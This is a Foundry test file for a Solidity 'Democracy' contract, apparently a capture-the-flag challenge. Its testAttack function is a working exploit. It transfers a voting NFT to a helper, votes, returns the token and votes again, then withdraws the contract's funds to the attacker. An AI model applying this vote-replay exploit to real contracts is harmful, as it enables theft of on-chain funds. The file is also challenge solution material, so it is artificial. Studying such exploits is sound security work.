// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/test.sol";
import {Democracy} from "../src/Democracy.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract DemocracyTest is Test {
    Democracy public democracy;

    address challenger1 = vm.addr(0x1);
    address initialOwner = vm.addr(0x2);
    address helper = vm.addr(0x3);
    address helper2 = vm.addr(0x4);

    function setUp() public {
        // owner = incumbent
        vm.prank(initialOwner);
        democracy = new Democracy();
    }

    function testOwnerIsIncumbent() public {
        assertEq(democracy.incumbent(), democracy.owner());
    }

    function testNominateChallenger() public {
        democracy.nominateChallenger(challenger1);
        assertEq(democracy.challenger(), challenger1);
        // Check Balance of each address
        assertEq(democracy.balanceOf(challenger1), 2); // tokens 0 and 1
        assertEq(democracy.balanceOf(initialOwner), 0);
    }

    function testAttack() public {
        democracy.nominateChallenger(challenger1);
        assertEq(democracy.balanceOf(challenger1), 2);
        vm.prank(challenger1);
        democracy.transferFrom(challenger1, helper, 0);
        vm.startPrank(helper);
        democracy.vote(challenger1);
        democracy.transferFrom(helper, challenger1, 0);
        vm.startPrank(challenger1);
        democracy.vote(challenger1);
        democracy.withdrawToAddress(challenger1);
    }
}
